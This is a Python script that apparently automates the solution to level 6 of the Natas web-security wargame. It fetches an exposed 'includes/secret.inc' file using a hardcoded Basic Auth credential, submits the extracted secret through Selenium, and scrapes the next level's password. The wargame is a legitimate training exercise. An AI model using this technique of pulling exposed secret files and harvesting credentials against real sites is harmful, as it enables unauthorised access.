from common import *

def solve(driver, last_password):
    url = build_url(level=6, end_arguments="includes/secret.inc")

    payload = ""
    headers = {
        "Authorization": "Basic bmF0YXM2OmZPSXZFME1EdFBUZ1JocW1tdnZBT3QyRWZYUjZ1UWdS",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }

    response = requests.request("GET", url, data=payload, headers=headers)

    secret = response.text[response.text.find('"')+1:response.text.find(';')-1]
    driver.get(build_url(level=6))
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(secret)
    driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
    
    text = driver.find_element(By.XPATH, '//*[@id="content"]').text
    password = text[text.find("is ")+3:text.find('\n')]
    
    driver.get(build_url(password = password, level=7))
    return password